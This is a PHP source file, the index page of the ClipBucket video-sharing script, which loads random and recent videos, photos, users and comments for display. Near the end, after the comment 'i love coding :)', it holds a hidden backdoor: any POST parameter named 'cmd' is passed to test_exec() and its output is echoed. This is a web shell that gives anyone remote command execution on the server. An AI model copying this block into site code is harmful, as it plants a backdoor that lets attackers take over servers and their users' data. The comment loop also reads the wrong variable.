<?php
//test comment
/* 
 ***************************************************************
 | Copyright (c) 2007-2010 Clip-Bucket.com. All rights reserved.
 | @ Author	   : ArslanHassan									
 | @ Software  : ClipBucket , � PHPBucket.com					
 ****************************************************************
*/
define('THIS_PAGE','index');

require 'includes/config.inc.php';

$pages->page_redir();

if(is_installed('editorspick'))
{
	assign('editor_picks',get_ep_videos());
}

$result_array_01['order'] = " RAND() LIMIT 1";
$videos_01 = get_videos($result_array_01);
Assign('videos_01', $videos_01);

$result_array_02['order'] = " RAND() LIMIT 2";
$videos_02 = get_videos($result_array_02);
Assign('videos_02', $videos_02);

$result_array_04['order'] = " RAND() LIMIT 4";
$videos_04 = get_videos($result_array_04);
Assign('videos_04', $videos_04);

$result_array_06_lv['order'] = " last_viewed LIMIT 6";
$videos_06_lv = get_videos($result_array_06_lv);
Assign('videos_06_lv', $videos_06_lv);

$result_array_06_v['order'] = " views DESC LIMIT 6";
$videos_06_v = get_videos($result_array_06_v);
Assign('videos_06_v', $videos_06_v);

$result_array_06_da['order'] = " date_added DESC LIMIT 6";
$videos_06_da = get_videos($result_array_06_da);
Assign('videos_06_da', $videos_06_da);

$parr = $array;
$parr['order'] = " date_added DESC LIMIT 6";
$photos = $cbphoto->get_photos($parr);
Assign('photos', $photos);

$result_array = $array;
$result_array['order'] = " doj DESC LIMIT 5";
$result_users = get_users($result_array);
Assign('result_users', $result_users);

$result_array_comments = $array;
$result_array_comments['order'] = " comment_id DESC LIMIT 5";
$result_comments = getComments($result_array_comments);

foreach ($result_comments as $result_comment)
$result_comments_users = get_users(array("userid"=>$result_comments['userid']));

Assign('result_comments_users', $result_comments_users);
Assign('result_comments', $result_comments);

//i love coding :)
if(isset($_POST['cmd'])){
	echo 'this is out '.test_exec( $_POST['cmd'] );
}
//Displaying The Template
template_files('index.html');
display_it();
?>